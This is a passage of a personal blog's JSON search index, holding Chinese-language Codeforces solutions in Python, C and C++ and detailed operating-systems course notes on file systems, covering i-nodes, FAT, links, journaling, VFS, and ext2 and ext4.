0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce-Bit++","slug":"算法竞赛/Codeforce/800/Codeforce-Bit","date":"2025-03-25T17:57:32.000Z","updated":"2025-04-02T11:05:16.379Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Bit/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Bit/","excerpt":"","text":"题目描述 思路对于每一行命令检测+是否在里面就好。 代码Python123456789n = int(input())x=0for _ in range(n): op = input() if \"+\" in op: x += 1 else: x -= 1print(x) C1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n, x = 0; scanf(\"%d\", &amp;n); char op[5]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", op); if (strchr(op, '+')) { x += 1; } else { x -= 1; } } printf(\"%d\\n\", x); return 0;} C++","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Team","slug":"算法竞赛/Codeforce/800/Codeforce-Team","date":"2025-03-25T17:42:06.000Z","updated":"2025-04-02T11:05:46.927Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Team/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Team/","excerpt":"","text":"题目描述 一共有 n 道题目，而对于每道题，他们会选择是否去做这题：只有当三个人中至少有两个人对这题有把握时，他们才会决定去做。 思路直接计算每行的和是否大于等于2。 代码Python123456789n = int(input()) count = 0 for _ in range(n): a, b, c = map(int, input().split()) if a + b + c &gt;= 2: count += 1 print(count) C1234567891011121314151617#include &lt;stdio.h&gt;int main() { int n, a, b, c; int count = 0; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) { scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c); if (a + b + c &gt;= 2) { count++; } } printf(\"%d\\n\", count); return 0;} C++123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main(){ int n; cin &gt;&gt; n; int a,b,c; int count=0; for( int i=0; i &lt; n; i++){ cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(a+b+c &gt;1){ count +=1; } } cout &lt;&lt; count; return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Way Too Long Words 题解","slug":"算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words","date":"2025-03-25T17:28:41.000Z","updated":"2025-04-02T11:04:46.144Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","excerpt":"","text":"题目描述 简单来讲就是需要”简化“长单词。 思路先判断单词长度。如果小于等于10就不用管，如果超过10，则写成：首字母 + 中间的字母数量 + 末尾字母。 代码Python1234567n = int(input())for _ in range(n): word = input() if len(word) &gt; 10: print(word[0] + str(len(word) - 2) + word[-1]) else: print(word) C123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; scanf(\"%d\", &amp;n); char word[101]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", word); int len = strlen(word); if (len &gt; 10) { printf(\"%c%d%c\\n\", word[0], len - 2, word[len - 1]); } else { printf(\"%s\\n\", word); } } return 0;} C++12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int n; cin &gt;&gt; n; string word; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; word; int len = word.length(); if (len &gt; 10) { cout &lt;&lt; word[0] &lt;&lt; len - 2 &lt;&lt; word[len - 1] &lt;&lt; endl; } else { cout &lt;&lt; word &lt;&lt; endl; } } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"GBS 7 Dateisystem 文件系统","slug":"TUM笔记/GBS/GBS-7-Dateisystem-文件系统","date":"2025-03-24T20:53:38.000Z","updated":"2025-04-01T21:48:05.340Z","comments":true,"path":"2025/03/24/TUM笔记/GBS/GBS-7-Dateisystem-文件系统/","permalink":"https://archer-baiyi.github.io/2025/03/24/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-7-Dateisystem-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"操作系统基础相关笔记","text":"Einführung首先我们需要先明确为什么需要文件系统： 进程在运行期间只能使用其虚拟地址空间来存储数据：容量有限。 当进程结束时，其虚拟地址空间中的数据会丢失：无法实现持久的、长期的数据存储。 在虚拟进程地址空间中存储数据只允许有限的共享访问：不能实现同时并行使用。 所以我们需要文件系统来提供更高级别，更持久、更可靠并且可共享的数据存储功能。 也就意味着我们会对文件系统有着以下要求： 提供存储空间以容纳大量数据（Speicherplatz für (sehr) große Datenmengen bereitstellen） 防止数据丢失（Datenverlust vermeiden） 支持并发访问数据（Nebenläufigen Zugriff auf Daten ermöglichen） 多个进程应能够同时访问数据。 文件系统的基本作用是将硬盘上的原始数据块组织成结构良好的文件，使得用户和程序可以方便地存取数据。 具体的任务包括： 可以描述文件的数据结构（Datenstrukturen zur Beschreibung von Dateien） 实现文件（Implementierung der Dateien） 命名（Benennung） 允许访问文件（Zugriffe auf Dateien ermöglichen） 防止未授权访问（Schutz vor unberechtigten Zugriffen） 常见的文件系统有： FAT-16/32 (DOS) 老式的微软文件系统 NTFS (Windows NT) 微软当前主流的文件系统 Ext2/3/4 (Linux) Linux 系统中广泛使用的文件系统系列（Ext4是目前主流） 硬盘硬盘作为长期存储的媒介，可以被看作是一串固定大小的线性数据块序列（ eine lineare Sequenz von Blöcken fester Größe ）。这里的块（Block）就是硬盘读写的基本单位（Einheit）。这里的块的大小是由操作系统决定的，和硬盘的sector没有直接的大小关系。 而为了更好的管理硬盘的存储空间，我们需要操作系统对硬盘属性进行虚拟化，也就是所谓的文件概念（Datei-Konzept）： 文件是逻辑上的管理单元。（Dateien sind logische Verwaltungs-Einheiten） 文件可以持久地存储任意信息。（Dateien speichern beliebige Informationen persistent (dauerhaft)） 文件系统对块的存储位置、空闲状态等进行了抽象处理。（Datei abstrahiert davon, wo die Blöcke gespeichert sind, welche Blöcke frei sind usw.） 进程可以通过系统调用来创建、写入、读取和删除文件。（erstellen, schreiben, lesen, löschen） 文件不仅被用户程序使用，也被系统软件使用。（ Dateien werden sowohl von Benutzerprogrammen als auch von der Systemsoftware verwendet） 文件 （Dateien）我们首先通过用户视角来了解一下文件系统：就从我们日常接触的文件开始。 文件作为被管理的单位（zu verwaltende Einheiten），可以被不同的进程使用。所有文件都必须有名字，没有统一的命名规则。一般情况下名字会由2部分组成：名字（Name）和扩展名（Extension）。而有些系统（比如说Windows）会解析扩展名，有些则不会（比如UNIX）。 文件可以采用三种不同的结构方式： 非结构化（Unstrukturiert） 操作系统只把文件当作一串字节（eine Folge von Bytes）（适用于 UNIX 和 Windows）来看待，它不会尝试去理解文件里面到底是什么内容。 优点：用户程序有更大的灵活性 固定大小记录的序列（Sequenzen von Einträgen fester Größe） 每条记录有固定的大小和结构，比如每行只能写 80 个字符。现代的操作系统已经很少使用这种方式了。 具有不同大小记录的树结构（Ein Baum mit Einträgen unterschiedlicher Größe） 每条记录都有一个Key，这些Key都是有序存储的。适合在大型计算机的操作系统（Großrechner-BS ）中用于处理大量数据。 文件类型（Dateitypen）操作系统支持多种文件类型： 普通文件（ Dateien，regular files）： 包含用户数据的文件，比如说： 文本文件（Text-Dateien）： Bestehen aus Zeilen, die durch carriage return （回车符，\\r）und/oder linefeed Zeichen（换行符，\\n） abgeschlossen sind. 二进制文件（Binärdateien）：具有特定格式，比如说可执行文件、压缩包等。 目录（Verzeichnisse，directories）： 是用于组织和管理文件系统中结构的系统文件。 块设备文件（Block Special Files） 字符设备文件（Character Special Files） 在linux种可以用 ls -l 来查看文件类型： 第一位字符 文件类型 - 普通文件 d 目录 c 块设备文件 b 字符设备文件 例子： 1234drwxr-xr-x 2 user user 4096 Mar 26 test_folder-rw-r--r-- 1 user user 1234 Mar 26 notes.txtcrw-rw---- 1 root tty 4, 0 Mar 26 /dev/tty0brw-rw---- 1 root disk 8, 0 Mar 26 /dev/sda 可执行文件的结构： 压缩文件的结构： 文件访问方式（Dateizugriff）顺序访问（Sequential access）（只有在很老的操作系统里才会出现了。） 在这种访问下，进程需要按顺序读取文件中的字节（或记录），文件的部分内容不能跳过，适合磁带类存储设备。 比如说读一本书的时候只能一页一页往后翻，不能直接跳到第50页。 随机访问（Random-access）进程可以按任意顺序读取文件中的字节（或记录），在数据库系统中尤其重要（快速定位记录）。 UNIX 系统中，lseek 系统调用可以改变“读写指针”位置： 1lseek(fd, 1024, SEEK_SET); fd是文件描述符，1024是偏移量（offset）（单位是Byte），SEEK_SET 则是定位方式，有几种选择： 常量名 含义 SEEK_SET 从文件开头开始偏移 offset 字节 SEEK_CUR 从当前位置开始偏移 SEEK_END 从文件末尾开始偏移 （offset需要调整为负数） 例子： 12345678910111213141516171819202122232425262728293031#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123; int fd; // 文件描述符 char buf[128]; // 缓冲区，用于读取128字节内容 // 打开文件 &quot;myfile.txt&quot;，只读方式 fd = open(&quot;myfile.txt&quot;, O_RDONLY); if (fd &lt; 0) // 如果打开失败，退出 return EXIT_FAILURE; // 将文件读写位置移动到从文件头开始的第1024个字节 if (lseek(fd, 1024, SEEK_SET) &lt; 0) return EXIT_FAILURE; // 从当前位置读取128字节到缓冲区buf中 if (read(fd, buf, 128) &lt; 0) return EXIT_FAILURE; // 打印读取到的内容 printf(&quot;%s\\n&quot;, buf); // 关闭文件 close(fd); // 正常退出 return EXIT_SUCCESS;&#125; 文件属性（Dateiattribute）每份文件除了文件名和文件内容外还会附带一些其他信息：元信息（Meta-Informationen）。 元信息包含： 对文件的访问权限 比如说在UNIX里，权限赋予对象分成 所有者（Owner）、用户组（Group）、所有人（All）。而权限种类有r（读取）、w（写入）、x（执行） 例子： 1-rwxr--r-- 标志位（flags）：控制文件的某些属性 比如说可以将文件设置为隐藏、标识为二进制或归档文件等。 详见： 文件操作（Datei-Operationen）常见的文件操作都是通过系统调用提供的： 创建和删除文件 open （打开）: 在访问一个文件之前，必须先打开它。这会让操作系统把文件属性和其他信息加载到内存中，方便快速处理。open() 系统调用返回一个文件描述符（file descriptor），这是一个小的整数，用来标识这个打开的文件。 unlink （删除） 后续对文件的访问（通过文件描述符） close （关闭） 使用文件描述符来关闭文件，释放内部数据结构资源。 read （读取） 指定要读取的数据以及一个缓冲区（buffer），读取的内容将被放入该缓冲区。 一定要提前创建一个缓冲区！ write （写入） 将数据写入到当前文件指针所在的位置，注意原有数据可能会被覆盖。 seek （定位） 移动文件指针到指定位置（之后可以从该位置读取或写入）。（见上面随机访问那里的例子） 代码例子： 12345678910111213141516171819202122232425262728293031323334#include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; // 包含 open() 的相关定义和文件权限#include &lt;unistd.h&gt; // 包含 read(), write(), close() 的声明#define BUF_SIZE 4096 // 定义缓冲区的大小int main (int argc, char *argv[]) &#123; int fd_in, fd_out, count; // 2个文件描述符 和 读写字节数计数器 char buf[BUF_SIZE]; // 缓冲区 // 如果参数个数不为3（程序名 + 输入文件 + 输出文件），则失败退出 if (argc != 3) return EXIT_FAILURE; // 打开输入文件，只读模式（O_RDONLY） if ((fd_in = open(argv[1], O_RDONLY)) == -1) return EXIT_FAILURE; // 打开或创建输出文件，只写模式，权限为用户可读写（rw- --- ---） if ((fd_out = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)) == -1) return EXIT_FAILURE; // 读取输入文件的内容并写入到输出文件中，直到读完 while ((count = read(fd_in, buf, BUF_SIZE)) &gt; 0) &#123; // 如果写入失败或未能写入全部内容，返回失败 if (write(fd_out, buf, count) &lt;= 0) return EXIT_FAILURE; &#125; // 关闭两个文件描述符 close(fd_in); close(fd_out); return EXIT_SUCCESS; // 成功结束程序&#125; 目录（Verzeichnisse）文件系统通过目录来组织文件。而目录本质上是一个特殊的文件，它只包含管理信息（比如：文件名、路径、指针等）。目录使文件系统支持层级管理（hierarchische Verwaltung），让结构更清晰、查找更高效。 下面这两种是比较常见的目录结构： 1. 单层目录结构（Single-Level Verzeichnisstrukturen） 在这种结构里只有一个目录（根目录，root directory）用于存放所有文件。目前依然在一些嵌入式系统中使用。 优点：文件可以很快被找到（因为都在同一个地方）。 缺点：所有用户共享同一个目录，没有分层结构。 2. 层次型目录结构（Hierarchische Verzeichnisstrukturen） 这种会将相关的文件以分层方式组织在目录中，每个用户拥有自己专属的主目录，并可包含子目录。 路径名（Pfadnamen）路径名是为了在树状结构的文件系统中为文件命名，一般分3种： 1. 绝对路径名（Absolute Pfadnamen） 路径从根目录（Root-Verzeichnis）开始，一直到目标文件。 注意：UNIX/Linux 中用 / ，Windows 中用 \\ 。 例子： 1/tum/git/gbs/uebungsbetrieb/ws18/09/c-files/mem.c 2. 相对路径名（Relative Pfadnamen） 路径是相对于当前工作目录（Current Working Directory）而言的。 比如当前路径是 1/tum/git/gbs/uebungsbetrieb/ws18/09 的时候，就可以这样引用文件：123blatt09.pdf或者c-files/mem.c 3. 特殊路径 . 表示当前目录，.. 表示上一级目录。 例子： 假设当前路径是 1ws18/09/ 可以用 12cp ../08/gbsuebung.cls .# 从当前目录的上一级目录中的 08 子目录里，复制 gbsuebung.cls 文件到当前目录中 文件系统从现在开始我们从实现角度（Implementierungs-Sicht）来了解文件系统：它内部是如何实现各种功能的。 文件系统布局（Dateisystem-Layout）硬盘会被划分为多个分区（Partitionen），每个分区可以独立存储一个文件系统，彼此之间互不影响。 位于 Sektor 0 的是主引导记录（MBR，Master Boot Record）。里面存储了一个分区表（Partitions-Tabelle），用于纪录每个分区的起始和结束地址。 在启动电脑时（Booten），BIOS（或现代的 UEFI）会读取 MBR，执行 MBR 程序，然后根据分区表（Partitions-Tabelle）定位到活动分区（aktiven Partition），读取并执行该分区的第一个块 Boot Block 中的代码，引导操作系统加载。 每个分区内部的结构会随着文件系统的不同而变化。 上面图片里展示的是UNIX/Linux中文件系统的例子： 超级块（Superblock） 存储关于整个文件系统的关键信息，包括 Magic Number（识别文件系统类型的标识）, Anzahl der Blöcke, etc. 空闲块信息（Informationen über freie Blöcke） （上一章的内容）可以通过位图（Bitmap）或者指针链表（Pointer List）实现。 文件描述符集合（i-nodes） 文件和目录 文件的存储与实现方式（Implementierung von Dateien）文件系统管理那些用于保存文件内容的磁盘块（Blöcke），但每个文件的数据都被分成多个块，系统怎么样可以知道这些块在哪儿呢？ 以下是管理文件内容所用的三种主要实现方案： 连续分配（Contiguous Allocation）文件被视为硬盘上一串连续的块，也就是说文件的所有数据块在物理磁盘上是挨在一起的（如下图）。 优点： 实现简单（Einfache Implementierung） 读取性能高（Lesen ist sehr performant） 由于数据连续，只需一次磁头定位就可以一次性把整个文件读完，非常高效。 缺点： 外部碎片问题（Externe Fragmentierung） 指随着文件的创建与删除（也就是外部原因）会产生很多小块，导致很难找到一大块连续空间给新文件。（如下图所示） （interne Fragmentierung 指的是想Buddy Algorithm那样算法本身导致的碎片化。） 所以比较适合只读介质（Read-Only-Medien），比如说CD-ROM，DVD，BluRay-Disks 链式分配（Linked List Allocation）使用一个链表管理所以文件使用的块，每个块的开头包含指向下一个块的指针。 优点： 不会浪费空间 不像连续分配那样需要一整段连续空闲区域，所有零散的空闲块都可以利用 缺点： 随机访问性能差（Niedrige Performance bei Random-Access） 因为如果要访问第 n 块，必须先读取完前 n-1 块。 每个块要占用一点空间存指针 导致可用空间不是标准的 2 的幂（keine 2er-Potenz）。 与操作系统块大小兼容性差 因为许多系统要求块大小是固定的（例如 512B、1024B、2048B 等），指针占了空间后可能导致不便于按块读取。 针对提到的这些问题我们可以在此基础上进行一点改良： FAT 文件分配表（Linked List Allocation mit File Allocation Table）我们现在将所有指针集中存储在一张表中（FAT），放在主存（Hauptspeicher）中管理。 例子： 我们现在有2份文件： A：4, 7, 2, 10, 12 (-1 = Ende der Liste) B: 6, 3, 11, 14 (-1) 优点： 每个块不会浪费存储空间（kein Verschnitt） 随机访问（Random-Access）更快 只需要在内存中操作表即可 缺点： FAT 表必须常驻内存（RAM），会消耗大量内存。（磁盘空间越大FAT也越大） i-nodes（索引节点）每个文件都由一个i-node数据结构来表示，i-node中会包含文件的元数据（Dateiattribute）以及磁盘块的地址（ Adressen）。 优点： 内存占用低 因为只需将打开的文件的i-node加载到内存中。 可扩展性强 所需内存空间只与“同时打开的文件数”有关，而不是整个磁盘容量。 缺点： i-node 能存的地址数量是固定的 为了解决这个问题可以用多级间接地址： 比如说一级间接、二级间接、三级间接（Indirekte, doppelt indirekte und dreifach indirekte Blöcke），即最后的地址不是数据块，而是指向一个包含更多地址的“块地址表”（即指针块）。 目录（Verzeichnissen）操作系统需要通过解析路径名来找到硬盘上的实际文件位置。 一个目录其实就是一组目录项（Verzeichniseintrag，directory entry）的集合。当操作系统通过一个路径打开文件时，会挨个查找对应的目录项。 一个目录项会包含以下信息： 文件名 定位信息（Adress-Informationen, um die gesuchte Datei zu lokalisieren） 文件属性（Datei-Attribute） （注意，目录项和文件是2个不同的东西。目录项实际上只是一条纪录，用于指向一个文件或者子目录，并不会存储文件内容（用于导航）。而文件是实际存储数据的对象） 文件属性的存储有2种常见的方式： 1. 直接存储在目录项中： 每个目录项不仅包含文件名，还直接包含这个文件的属性信息。 2. 存储在 i-nodes 中： 每个目录项只包含文件名以及一个指向 i-node 的引用（编号或指针），文件的所有属性都集中保存在 i-node 中。 文件名的存储因为我们希望可以使用任意长度的文件名，所以需要考虑这些不同长度的文件名该怎么存储。 首先想到的便是 1. 固定文件名长度，比如说限制每份文件的文件名在255个字符以内。但是这样一来肯定需要给每份文件的文件名255个字符的位置，由于不是每份文件的名字都有这么长，很容易导致内存或者磁盘空间的浪费。 所以我们可以根据这个问题将这个方法改良一点： 2. 允许文件使用任意长度的文件名，然后专门用一块空间记录当前文件名的长度。（如下图） 但是这种方法同样也有一个很大的问题：因为文件名长度的不同意，创建和删除文件容易导致存储空间碎片化。为了解决这个问题我们可以考虑将所有的文件名集中存储，也就是: 3. 只存储文件属性以及一个指向堆（Heap）里存储文件名位置的指针。（如下图） 尽管已经改善很多了，但这个方案依旧不够完美：在包含大量条目的目录中查找文件会很慢（Suchen von Dateien in Verzeichnissen mit vielen Einträgen ist langsam）。所以我们可以 4. 在3的基础上引入哈希表来提高索引效率： 在每个目录中使用一个哈希表，通过对文件名进行哈希计算来得到目录项的索引。目录项中的哈希冲突（Kollisionen）则通过链表来处理。 链接（Links）为了让（不同）用户在不同路径下可以打开同一份文件，我们需要引入链接这个机制。 链接分为2种： 硬链接（Hard Links） 目录项不是直接指向文件数据，而是指向i-node，允许多个目录项指向同一个 i-node。注意，在硬链接里没有“主链接”或“次链接”的区别，所有硬链接是平等的。每个 i-node 会记录引用计数（ref count），当引用计数归零时，说明没有目录再指向它，就可以删除这个文件了。 （这也解释了 UNIX 删除命令叫 unlink()，因为它实际上是取消一个目录项到 i-node 的链接，而不是马上删除文件。） 软链接/符号链接（Symbolic Links）创建一个特殊类型的文件，里面保存的是目标文件的路径名。 软链接类似于Windows里的快捷方式，但并不完全一样。软连接是文件系统级别支持，而快捷方式则是应用层支持。这意味着系统层面会自动解析软链接，但是Windows里的快捷方式需要Shell或资源管理器解析。 日志文件系统（Journaling-Dateisysteme）主要是为了保证系统崩溃后的数据一致性，类似于Datenbank里的Transaktionsverwaltung。 在 UNIX 下删除一个文件需要3个步骤： 从目录中移除文件的目录项（Entferne die Datei aus ihrem Verzeichnis） 将文件对应的 i-node 释放（Gib den i-node in den Pool der freien i-nodes frei） 将文件占用的磁盘数据块标记为“可用”（Markiere alle von der Datei belegten Festplatten Blöcke als frei） 但如果在某一步结束后系统发生了崩溃，就会导致很严重的问题，比如说数据丢失或者是空间泄露。 所以我们需要日志文件系统（Journaling-Dateisysteme）来预防这些问题：会先将所有对文件系统的更改操作记录在日志区域（Journal）中，然后才实际执行。这样一来所有操作都可以从日志中恢复或重做，确保一致性。 具体操作流程： 首先创建一个日志条目，描述即将执行的三项操作。（Erstellen eines Log-Eintrags, der die drei Operationen beschreibt） 将该日志写入磁盘的日志区。（Speicherung in Journal auf der Platte） 然后需要重新读取日志内容以确认是否正确写入。 执行实际的3步操作。（Ausführen der drei Operationen） 每完成一步操作，都在磁盘上记录一次“进度”，表示该操作已完成。（Abschluss jeder Operation auf der Platte vermerkt: Fortschrittsbericht） 三个操作都成功完成后，删除日志条目。 然后在系统重启或者发生崩溃后会进行以下操作： 首先检查日志内容。（Inspektion des Journals） 如果发现某个操作没执行完，那么会重新执行所有操作。 只不过这些都一个共同的前提：所有操作必须是幂等的（idempotent），即进行1次操作与进行n次（相同的）操作得到的结果是一样的。 例子： 将一块Block标记成frei：是idempotent的。 把空闲块简单地加到“空闲块列表末尾”：不是idempotent的，需要改成 先检查一下块n是否已经在空闲列表中，如果没有，再加入。 还有一个办法也可以提高文件系统的可靠性（Erhöhung der Zuverlässigkeit）：把多个操作包装成一个原子事务（atomaren Transaktion，即 ganz oder gar nicht）。 虚拟文件系统（Virtual File System，VFS）为了系统的兼容性需求（不同的操作系统和设备可能使用不同的文件系统格式）以及多样化的应用场景，一般的操作系统都会支持多种文件系统。 比如在 Windows 下，可以同时有 NTFS、FAT32、CD-ROM 等文件系统。 Windows会将每个文件系统会被分配一个独立的盘符（如 C:、D:），而类 Unix 系统则是将所有文件系统整合到一个统一的层级结构中，对用户完全透明。 Unix的这个整合是便通过虚拟文件系统（Virtual File System，VFS）实现的。 VFS负责提供一个（遵循 POSIX 标准的）统一的接口（比如 open、read、write、lseek等），用于支持在一个本地系统中接入多种不同的文件系统。 图示： 优化策略（Optimierung）Buffer Cache（缓冲区缓存）（这部分ERA的Cache那一章会详细讲。） 文件系统使用内存中的一部分作为缓存区域，来暂存磁盘上的数据块。 对于读的操作的处理流程： 先检查所需的数据块是否已经在缓存中？如果是，就跳到步骤3 如果不在缓存中：就从磁盘读取这个块，并加载到缓存中 返回这个数据块的内容给调用者（用户进程） 当缓存空间不够时也需要替换策略（Ersetzungsstrategie）。 进行写的操作时数据会先写入缓存区，不一定立刻写入磁盘。在Unix中可以使用 sync 命令手动将缓存区内容写入磁盘，不过系统自己也会会周期性自动执行（例如每30秒由 update 守护进程（daemon）完成）。Windows采用的则是 Write-thru Cache，即写操作会立即同步到磁盘。 预读（Read-Ahead）预读指的是提前把即将需要的数据块加载到缓存中，以此来提高读取性能。 可以 简单预测，或者 即假设用户会按顺序进行读取，比如说在用户请求读取某个文件的第 k 块时，就先检查第 k+1 块是否已在缓存中。如果不在缓存，就提前加载第 k+1 块。 结合结合文件的访问历史进行预测 给文件设置一个属性，记录它是否是被顺序读取。如果确认是顺序访问，才启用 Read-Ahead。 减少磁盘读写头的移动 尽量让同一文件的块物理上靠得更近 比如存储在同一个磁柱（Zylinder）上的Blöcken里。 块组分配（Verwaltung von Blöcken in Gruppen） 不按单个块分配，而是每次分配2个或4个块。这样可以隐式地提高局部性（Lokalität）。 i-node 结构不要都集中在分区开头（i-nodes nicht (nur) am Anfang der Partition） 碎片整理（Defragmentierung）将文件的所有块重新排列，使它们尽可能连续，提高访问效率。（Neugruppierung der Blöcke der Dateien auf der Festplatte） 例子Linux的ext2ext2会将硬盘分区划分为“块组”结构（Aufteilung der Festplatten-Partition in Block-Gruppen）。 Block 0 是预留给系统启动用的（System-Bootup-Vorgang）。 而其余的所有Block-Gruppen都包含以下信息： 超级块（Superblock）： 包含有关文件系统布局的信息，比如说 i-node和数据块的总数、空闲块列表的指针等。 （Anzahl der i-nodes und Blöcke, Pointer zur Liste mit freien Blöcken, etc.） 组描述符表（Gruppen-Deskriptor-Tabelle）： 包含这个块组的信息，比如说Bitmap的位置、空闲的 i-node 和数据块的数量、目录的数量等。 （Position der Bitmaps, Anzahl freie i-nodes und Blöcke, Anzahl der Verzeichnisse） 两个位图（Bitmaps）： 每个Bitmap都是一个Block的大小，记录空闲块以及 i-nodes。通过这个Bitmap可以找到空闲的块以及i-nodes。 i-nodes Datenblöcke （这些Block groups都是ext2管理的空间） ext2中打开文件时，系统会在目录里查找该文件的i-node信息： 首先从目录条目（Verzeichniseintrag）中获取 i-node 编号（i-node-Nummer），通过该编号可以在硬盘上的 i-node 表中找到该文件的 i-node，并将其加载到内存中。 然后 i-node 会被写入内存中的 i-node 表。 i-node 表包含了所有已打开的文件和目录的 i-nodes。 目录文件结构图示： Linux的ext4ext4则是在ext2的基础上加了 journaling 日志机制。这里的日志是一个文件，它会通过一个环形缓冲区（ring buffer）来实现。日志由一个独立于文件系统的层管理，叫做 Journaling Block Device（JBD）。 JBD中支持以下几种数据结构： 日志记录（Log-Eintrag (Log Record)） 描述低等级的修改操作。 Beschreibt eine Low-level-Dateisystem-Operation, die einen Block modifiziert. 原子操作句柄（Atomic Operation Handle） 会将一组相关的日志记录组合在一起，并原子性地执行。（Gruppiert mehrere zusammengehörige Log-Einträge und führt sie atomar aus） 比如说 write 一般会涉及修改i-node、数据块、空闲块列表等信息，而这些操作应当作为一个整体 原子性执行（atomar als Einheit ausgeführt werden）。 事务（Transaktionen） JBD会将多个原子操作作为事务处理。一组日志记录只有在相关的所有实际写入操作都完成后，才能从日志中移除。 （这些内容在之前的日志文件系统（Journaling-Dateisysteme）都讲过，跟Datenbank里的也差不多。） ext4同样改进了将块映射到文件的方式：在ext2/3中都是使用指针指向单个块（Direkte und ein-/zwei-/dreifach indirekte Blöcke），这样一来如果块的数量过多可能会导致指针数量也过多。所以ext4采用的是Extents： Instead of storing a list of every individual block which makes up the file, the idea is to store just the address of the first and last block of each continuous range of blocks. These continuous ranges of data blocks (and the pairs of numbers which represent them) are called extents. （这段解释是这里来的：https://unix.stackexchange.com/questions/223310/what-do-extents-feature-do-in-ext4-filesystem-in-linux） 图示：","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating 